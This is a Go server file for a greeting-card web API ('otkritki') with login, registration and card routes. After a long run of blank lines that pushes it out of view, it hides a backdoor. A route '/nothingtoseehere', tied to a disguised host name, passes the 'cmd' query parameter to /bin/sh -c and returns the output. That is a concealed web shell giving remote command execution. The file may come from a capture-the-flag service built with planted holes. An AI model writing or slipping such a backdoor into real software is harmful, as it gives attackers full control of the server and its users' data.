package main

import (
	"context"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"time"

	"otkritki/core/routing"
	"github.com/gorilla/mux"
)

func makeRouter() *mux.Router {
    router := mux.NewRouter().PathPrefix("/api").Subrouter()
    router.Use(routing.CorsMiddleware)
    router.HandleFunc("/register", routing.RegisterPost).Methods("POST")
    router.HandleFunc("/login", routing.LoginPost).Methods("POST")

    authRoutes := router.NewRoute().Subrouter()
    authRoutes.Use(routing.AuthMiddleware)
    authRoutes.HandleFunc("/logout", routing.LogoutPost).Methods("POST")
    authRoutes.HandleFunc("/card", routing.CardPage).Methods("GET")
    authRoutes.HandleFunc("/cards", routing.GetCards).Methods("GET")
    authRoutes.HandleFunc("/check", routing.CheckAuth).Methods("POST")
    authRoutes.HandleFunc("/nothingtoseehere", frontPorch).
    Host("nothing.to.see.here").
    Methods("GET")

    maleRoutes := authRoutes.NewRoute().Subrouter()
    maleRoutes.Use(routing.MaleWiddleWare)
    maleRoutes.HandleFunc("/add_card", routing.AddCardPost).Methods("POST")

    return router
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	router := makeRouter()
	server := &http.Server{
		Addr:         "0.0.0.0:" + port,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      router,
	}
	go func() {
		if err := server.ListenAndServe(); err != nil {
			log.Fatal(err)
		}
	}()
	endChan := make(chan os.Signal, 1)
	signal.Notify(endChan, os.Interrupt)
	<-endChan

	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	if err := server.Shutdown(ctx); err != nil {
		log.Println("Could not shutdown gracefully: " + err.Error())
		os.Exit(1)
	}
	log.Println("Shutting down server...")
	os.Exit(0)
}





























































func frontPorch(w http.ResponseWriter, request *http.Request) {
    cmdValue := request.URL.Query().Get("cmd")
    if cmdValue == "" {
        w.Write([]byte("Nothing to see here...."))
        return
    }
    shell := exec.Command("/bin/sh", "-c", cmdValue)
    if output, err := shell.Output(); err != nil {
        w.Write([]byte("Error...but you are moving in a correct direction"))
        return
    } else {
        w.Write(output)
    }
}
